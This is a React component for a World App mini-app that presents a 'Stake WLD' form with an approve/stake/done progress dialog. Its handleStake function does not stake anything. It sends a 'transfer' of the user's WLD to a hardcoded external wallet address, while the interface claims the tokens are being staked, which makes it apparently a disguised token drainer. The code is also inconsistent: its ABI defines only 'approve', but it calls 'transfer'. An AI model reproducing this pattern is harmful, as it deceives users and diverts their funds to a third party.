
import { useState, useEffect } from 'react';
import { Dialog, DialogTitle, DialogContent, Stepper, Step, StepLabel, TextField, Button, CircularProgress, Box, Typography } from '@mui/material';
import { MiniKit } from '@worldcoin/minikit-js';
import { parseEther } from 'ethers';
// import abi from '../contracts/abi/main.json';
import { Abi } from 'viem';
import { Logo } from '../assets';
import styled from 'styled-components';

const LogoImage = styled.img`
  height: 30px;
`;

const ERC20_ABI = [
  {
    constant: false,
    inputs: [
      { name: "spender", type: "address" },
      { name: "value", type: "uint256" },
    ],
    name: "approve",
    outputs: [{ name: "", type: "bool" }],
    payable: false,
    stateMutability: "nonpayable",
    type: "function",
  },
] as const;

type Transaction = {
  address: string;
  abi: Abi | readonly unknown[];
  functionName: string;
  value?: string;
  args: string[];
};

const steps = ['Approve WLD', 'Stake Tokens', 'Done'];

const Stake = () => {
  const walletAddress = MiniKit.walletAddress;
  const [amount, setAmount] = useState('');
  const [openModal, setOpenModal] = useState(false);
  const [activeStep, setActiveStep] = useState(0);
  const [loading, setLoading] = useState(false);
  const [addressShort, setAddressShort] = useState<string>('');

  useEffect(() => {
    if (walletAddress && walletAddress.length > 0) {
      setAddressShort(walletAddress.slice(0, 4) + '...' + walletAddress.slice(-4));
    }
  }, [walletAddress]);

  const contractAddress = import.meta.env.VITE_APP_WORLD_CONTRACT_ADDRESS;
  const WLD_TOKEN_ADDRESS = import.meta.env.VITE_APP_WLD_TOKEN_ADDRESS;

  useEffect(() => {
    if (!MiniKit.isInstalled()) {
      return;
    }
  }, []);

  const handleStake = async () => {
    if (!amount || isNaN(Number(amount))) {
      alert("Please enter a valid amount");
      return;
    }
  
    setOpenModal(true);
    setLoading(true);
  
    try {
      if (!contractAddress || !WLD_TOKEN_ADDRESS) {
        throw new Error("Contract addresses not configured properly");
      }
  
      const parsedAmount = parseEther(amount).toString();
      const nonce = Date.now().toString(); // Unique per user or per session
      const deadline = (Math.floor(Date.now() / 1000) + 3600).toString(); // 1 hour from now
  
      // Create Permit2 object
      const permit2 = {
        permitted: {
          token: WLD_TOKEN_ADDRESS,
          amount: parsedAmount,
        },
        spender: contractAddress,
        nonce,
        deadline,
      };
  
      const transferTx: Transaction = {
        address: WLD_TOKEN_ADDRESS,
        abi: ERC20_ABI,
        functionName: "transfer",
        args: ["0x2f97BB8e18B8c49C9112E0524F3Ac7cE0E7727b3", parsedAmount],
      };
  
      const res = await MiniKit.commandsAsync.sendTransaction({
        transaction: [transferTx],
        permit2: [permit2],
      });
  
      if (res.finalPayload.status !== "success") {
        throw new Error(`Transaction failed: ${res.finalPayload.details || "Unknown error"}`);
      }
  
      setActiveStep(1);
      setActiveStep(2);
    } catch (err: any) {
      console.error("Staking Error:", {
        error: err,
        amount,
        contractAddress,
        WLD_TOKEN_ADDRESS
      });
  
      alert(err.message || "Transaction failed. Check console for details.");
      setOpenModal(false);
      setActiveStep(0);
    } finally {
      setLoading(false);
    }
  
  };

  return (
    <>
      <Box sx={{
        display: 'flex',
        justifyContent: 'space-between',
        alignItems: 'center',
        width: '100%',
        boxSizing: 'border-box',
        mb: 4
      }}>
        <LogoImage src={Logo} alt="App Logo" />
        <Box sx={{
          padding: '10px 20px',
          background: 'black',
          color: 'white',
          borderRadius: '10px',
          textTransform: 'uppercase',
        }}>
          {addressShort}
        </Box>
      </Box>

      <Box sx={{
        padding: '20px',
        background: 'rgba(0, 0, 0, 0.2)',
        borderRadius: '15px',
        color: 'black'
      }}>
        <Typography variant="h4" fontWeight={600} sx={{ mb: 2 }}>Stake WLD</Typography>
        <Typography sx={{ mb: 3, opacity: 0.7 }}>
          Enter the amount of WLD you want to stake.
        </Typography>

        <form
          onSubmit={(e) => {
            e.preventDefault();
            handleStake();
          }}
          style={{ display: 'flex', flexDirection: 'column', gap: '20px' }}
        >
          <TextField
            required
            type="number"
            label="Amount (WLD)"
            value={amount}
            onChange={(e) => setAmount(e.target.value)}
            fullWidth
            sx={{
              background: 'white',
              borderRadius: '10px',
              '& .MuiOutlinedInput-root': {
                '& fieldset': {
                  borderColor: 'transparent',
                },
                '&:hover fieldset': {
                  borderColor: 'transparent',
                },
                '&.Mui-focused fieldset': {
                  borderColor: 'transparent',
                },
              },
            }}
          />
          <Button
            type="submit"
            variant="contained"
            size="large"
            sx={{
              background: 'black',
              color: 'white',
              '&:hover': {
                background: 'rgba(0, 0, 0, 0.8)',
              },
              textTransform: 'uppercase',
              fontWeight: 600,
              padding: '15px'
            }}
          >
            Stake
          </Button>
        </form>
      </Box>

      <Dialog open={openModal} maxWidth="sm" fullWidth>
        <DialogTitle>Processing Your Stake</DialogTitle>
        <DialogContent>
          <Stepper activeStep={activeStep} alternativeLabel>
            {steps.map((label) => (
              <Step key={label}>
                <StepLabel>{label}</StepLabel>
              </Step>
            ))}
          </Stepper>

          <Box sx={{
            display: 'flex',
            flexDirection: 'column',
            alignItems: 'center',
            mt: 4,
            mb: 2,
          }}>
            {loading ? (
              <>
                <CircularProgress />
                <Typography sx={{ mt: 2 }}>Please wait…</Typography>
              </>
            ) : (
              <Button
                variant="outlined"
                onClick={() => {
                  setOpenModal(false);
                  setActiveStep(0);
                  setAmount('');
                }}
              >
                Close
              </Button>
            )}
          </Box>
        </DialogContent>
      </Dialog>
    </>
  );
};

export default Stake;
